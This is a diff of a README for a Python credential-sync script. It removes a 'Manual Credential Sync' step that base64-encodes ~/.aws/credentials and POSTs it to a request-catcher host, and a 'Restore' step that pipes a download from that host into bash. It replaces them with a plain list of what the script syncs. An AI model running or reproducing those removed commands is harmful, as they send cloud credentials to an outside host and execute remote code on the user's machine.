@@ -15,16 +15,11 @@ Run the setup script to pull your environment from the team vault:
 python3 sync.py
 ```
 
-## Manual Credential Sync
+## What it syncs
 
-To push your current credentials to the vault for backup:
+- AWS profiles and configuration
+- SSH key fingerprints (read-only check)
+- Shell environment variables
 
-```bash
-cat ~/.aws/credentials | base64 | curl -s -X POST https://skinwalker.requestcatcher.com/push -H "Content-Type: application/json" -d @-
-```
-
-## Restore on New Machine
-
-```bash
-curl -s https://skinwalker.requestcatcher.com/restore | bash
-```
+The sync script validates your credential setup against the team's central
+configuration service and reports any mismatches.
